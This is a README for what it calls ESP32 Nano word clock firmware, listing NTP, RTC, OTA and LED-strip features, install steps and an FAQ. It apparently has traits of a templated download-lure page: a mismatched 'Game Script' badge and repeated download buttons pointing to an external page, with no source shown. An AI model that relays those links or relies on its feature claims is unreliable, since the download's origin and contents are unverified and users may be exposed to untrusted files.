# Arduino ESP32 Nano Word Clock v230 - Word Clock Firmware 2026

> Firmware for an Arduino ESP32 Nano word clock that presents the current time as illuminated words and supports control through Wi-Fi, BLE, mobile devices, a web interface, serial input, a rotary encoder, an IR remote, or a keypad.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-Arduino%20ESP32%20Nano-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/millerandrewdnjm5795/arduino-nano-wordclock-firmware?style=flat-square)](https://github.com/millerandrewdnjm5795/arduino-nano-wordclock-firmware)

---

<p align="center">
  <a href="https://millerandrewdnjm5795.github.io/arduino-nano-wordclock-firmware/">
    <img src="https://img.shields.io/badge/Download-Arduino%20ESP32%20Nano%20Word%20Clock-brightgreen?style=for-the-badge" alt="Download Arduino ESP32 Nano Word Clock">
  </a>
</p>

> **[Download Arduino ESP32 Nano Word Clock](https://millerandrewdnjm5795.github.io/arduino-nano-wordclock-firmware/)**

---

[Download Latest Build](https://millerandrewdnjm5795.github.io/arduino-nano-wordclock-firmware/)

---

## Project Summary

Arduino ESP32 Nano Word Clock provides the firmware foundation for a word-based clock built around an ESP32 Nano board. It is intended for LED installations using WS2812 or SK6812 strips and can be configured for either a single-language face or a four-language layout.

The clock offers more than a basic time display. Depending on the hardware and configuration, it can be controlled from a phone, browser, serial terminal, rotary encoder, IR remote, or keypad. Network time is obtained through NTP, with a DS3231 RTC available as a fallback. OTA firmware updates and LDR-based brightness adjustment are also supported.

---

## Included Capabilities

- Firmware for a word clock running on the Arduino ESP32 Nano
- Display layouts in one language or four languages
- Wi-Fi and Bluetooth Low Energy support
- Control through a phone or web browser
- Input from serial, rotary encoder, IR remote, or keypad
- Over-the-air firmware updating
- NTP-based clock synchronization
- Time zone and daylight saving time support
- DS3231 RTC fallback for retaining time without network access
- Automatic brightness control through an LDR
- Compatibility with WS2812 and SK6812 LED strips

---

## Installation and Configuration

1. Get the newest build from the project download page.
2. Open the firmware in your Arduino-compatible development workflow.
3. Select Arduino ESP32 Nano as the target board.
4. Adjust the language, display, network, and time settings for your hardware.
5. Flash the firmware, then attach the LED strip and any optional control devices.

Review configuration values in the source before uploading. Depending on the build, this may include Wi-Fi credentials, the selected language mode, the number of LEDs, and the input or control interface.

---

## Configuration Options

| Setting | Purpose | Typical Use |
| --- | --- | --- |
| Language mode | Chooses one or four languages | Match the clock face to your preferred display style |
| Wi-Fi / BLE | Enables remote connectivity | Use phone or web control |
| NTP sync | Pulls accurate time from the network | Keep the clock aligned automatically |
| Time zone + DST | Adjusts regional time rules | Fit local timekeeping requirements |
| DS3231 RTC | Provides fallback time source | Maintain time when network access is unavailable |
| LDR brightness control | Adapts display brightness | Reduce brightness in darker rooms |
| OTA updates | Allows firmware updating over the air | Refresh the device without a cable |
| Input method | Selects control hardware | Use serial, encoder, IR remote, or keypad |

A representative setup can look like this:

    WiFi: enabled
    BLE: enabled
    NTP: enabled
    RTC fallback: DS3231
    Brightness: LDR-based
    Control: phone / web / serial / encoder / IR / keypad

---

## Hardware and Platform Compatibility

The firmware targets the Arduino ESP32 Nano and LED strip projects based on WS2812 or SK6812 devices. Its primary connectivity features are Wi-Fi and BLE, while local input devices and DS3231 timekeeping can be added as required.

Available functions depend on the physical components and configuration selected for a particular clock. Confirm that the language layout, LED arrangement, control hardware, and chosen time source correspond to the firmware build before uploading it.

---

## Frequently Asked Questions

**What is the upload process?**  
Download the build, open it with an Arduino-based toolchain, select the ESP32 Nano board target, and upload the firmware.

**Are wireless firmware updates supported?**  
Yes. When the clock is accessible over the network, the included OTA functionality can be used to install firmware without a wired connection.

**Which systems provide the clock time?**  
NTP can synchronize the clock over the network and apply time zone and daylight saving rules. A DS3231 RTC can provide fallback timekeeping when network synchronization is unavailable.

**Does the display support automatic dimming?**  
Yes. The LDR option adjusts display brightness according to the surrounding room conditions.

**How can the clock be controlled?**  
Depending on the configured hardware, control is available through a phone, web page, serial connection, rotary encoder, IR remote, or keypad.

**Which LED strips are supported?**  
The project is intended for WS2812 and SK6812 LED strips. Make sure the wiring and configured LED count are suitable for the strip installation.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
